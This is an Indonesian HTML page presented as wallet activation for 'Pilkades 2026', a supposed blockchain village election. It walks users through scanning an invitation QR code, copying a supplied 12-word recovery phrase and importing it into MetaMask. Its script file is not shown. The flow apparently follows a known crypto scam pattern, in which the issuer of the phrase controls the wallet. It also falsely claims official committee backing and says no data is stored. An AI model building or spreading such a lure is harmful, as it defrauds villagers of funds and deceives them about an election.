<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Pilkades 2026 - Aktivasi Wallet</title>
    <link rel="stylesheet" href="index.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
</head>
<body>
    <!-- HALAMAN AWAL -->
    <div id="mainView">
        <div class="card">
            <h1>Pilkades 2026</h1>
            <p class="subtitle">Aktivasi Wallet Voting Desa</p>
            <div class="steps">
                Klik tombol <b>Scan QR Code Undangan</b> di bawah → izinkan akses kamera → arahkan ke <b>QR Code
                    Undangan</b> dari panitia.
            </div>
            <div class="seed seed-locked" id="seedBox">
                <i class="fas fa-qrcode qr-icon"></i>
                <div class="waiting-text">
                    Menunggu scan <span class="blink">QR Code</span> undangan...
                </div>
            </div>
            <button class="btn btn-scan" id="scanBtn">
                <i class="fas fa-camera"></i> Scan QR Code Undangan
            </button>
            <div class="footer">
                Panitia Desa • Sistem Voting Blockchain 2026<br>
                Hubungi panitia jika ada kendala
            </div>
        </div>
    </div>

    <!-- IZIN KAMERA -->
    <div id="permissionOverlay">
        <div class="perm-icon"><i class="fas fa-camera"></i></div>
        <div class="perm-title">Izinkan Kamera</div>
        <div class="perm-text">
            Aplikasi akan memindai QR Code undangan resmi.<br>
            <b>Kamera hanya digunakan saat scanning.</b><br>
            Tidak ada data yang disimpan.
        </div>
        <button class="perm-btn" id="allowBtn">Izinkan Akses Kamera</button>
    </div>

    <!-- SCANNER -->
    <div id="scannerOverlay">
        <div class="closeScanner" id="closeScanner"><i class="fas fa-times"></i></div>
        <div class="scanner-title">Scan QR Code</div>
        <div id="reader"></div>
        <button class="btn btn-gallery" id="galleryBtn">
            <i class="fas fa-images"></i> Pilih dari Galeri
        </button>
        <p style="margin-top:20px;color:#ff6b00;font-size:1.1em;font-weight:bold;">
            Arahkan kamera ke QR Code di undangan
        </p>
    </div>
    <input type="file" id="qrInput" accept="image/*" style="display:none;">

    <!-- HALAMAN SUKSES -->
    <div id="successView" style="display:none;">
        <div class="card">
            <h1>Pilkades 2026</h1>
            <p class="subtitle">QR Code Berhasil Discan!</p>
            <div style="text-align:center;margin:20px 0;">
                <i class="fas fa-check-circle" style="font-size:80px;color:#0f0;"></i>
            </div>
            <p class="subtitle"><strong>Silahkan aktivasi Wallet voting kamu!</strong></p>
            <p class="subtitle">Sekarang ikuti langkah dibawah ini:</p>
            <div class="steps">
                1. Klik tombol <b>Copy 12 Kata Rahasia</b> di bawah<br>
                2. Klik tombol <b>Buka MetaMask Sekarang</b> di bawah<br>
                3. Pilih <b>Saya sudah memiliki dompet</b><br>
                4. Pilih <b>Impor menggunakan frasa pemulihan rahasia</b><br>
                5. Klik <b>Tempel</b> (12 kata otomatis masuk) → <b>Lanjutkan</b><br>
                6. Buat kata sandi baru (minimal 8 karakter)<br>
                7. Centang kotak kecil: <b>“Jika saya lupa kata sandi ini...”</b><br>
                8. Klik <b>Buat Kata Sandi</b> → <b>Lanjutkan</b><br>
                9. Muncul “Dompet Anda sudah siap” → klik <b>Selesai</b>
            </div>
            <div class="seed" id="finalSeed">Memuat...</div>
            <button class="btn btn-copy" id="finalCopyBtn">
                <i class="fas fa-copy"></i> <span>Copy 12 Kata Rahasia</span>
            </button>
            <button class="btn btn-metamask" id="openMetaMaskBtn">
                <i class="fas fa-wallet"></i> Buka MetaMask Sekarang
            </button>
            <div class="footer">
                Panitia Desa • Sistem Voting Blockchain 2026<br>
                Hubungi panitia jika ada kendala
            </div>
        </div>
    </div>

    <!-- POPUP ERROR -->
    <div id="errorPopup">
        <div style="font-size:90px;color:#ff4444;margin-bottom:20px;"><i class="fas fa-times-circle"></i></div>
        <div style="font-size:2.3em;color:#ff6b00;margin:15px 0;font-weight:bold;">QR Code Tidak Valid</div>
        <div style="font-size:1.15em;line-height:1.8;max-width:90%;margin:20px 0;">
            Maaf, QR Code yang Anda scan <b>bukan undangan resmi Pilkades 2026</b>.<br><br>
            Pastikan Anda memindai <b>QR Code dari undangan kertas</b> yang diberikan panitia desa.<br><br>
            <small style="color:#aaa;">Contoh: QR di pojok undangan bertuliskan "Aktivasi Wallet Voting"</small>
        </div>
        <button id="retryBtn"
            style="background:#0066ff;color:white;padding:18px 50px;font-size:1.3em;border-radius:60px;border:none;cursor:pointer;">
            <i class="fas fa-camera"></i> Coba Scan Lagi
        </button>
    </div>

    <!-- Load library + script -->
    <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
    <script src="index.js"></script>
</body>
</html>